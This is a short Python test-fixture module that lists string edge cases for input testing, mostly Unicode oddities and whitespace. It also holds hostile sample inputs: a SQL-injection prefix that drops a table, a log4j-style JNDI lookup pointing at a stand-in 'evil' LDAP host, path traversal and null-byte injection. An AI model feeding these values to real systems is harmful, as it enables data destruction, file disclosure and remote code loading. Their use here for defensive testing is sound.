"""String edge cases — Unicode oddities, injection prefixes, length bombs."""

from __future__ import annotations

STRING_EDGES: tuple[str, ...] = (
    "",
    " ",
    "\x00",
    "\n",
    "\r",
    "\r\n",
    "\t",
    "A" * 10_000,  # length bomb
    "café",  # NFC: 4 codepoints
    "café",  # NFD: 5 codepoints, same NFC form
    "‮",  # right-to-left override
    "​",  # zero-width space
    "‍",  # zero-width joiner
    "﻿",  # BOM
    "👨‍👩‍👧",  # ZWJ family emoji (1 grapheme, 3 codepoints + 2 joiners)
    "'); DROP TABLE x;--",  # SQL-injection prefix
    "${{ jndi:ldap://evil }}",  # log4j-style template
    "../" * 50,  # path traversal
    "%00admin",  # null-byte injection
    "\\x00\\x00",
    "\udcff",  # lone surrogate
)


def string_edges() -> list[str]:
    return list(STRING_EDGES)


__all__ = ["STRING_EDGES", "string_edges"]
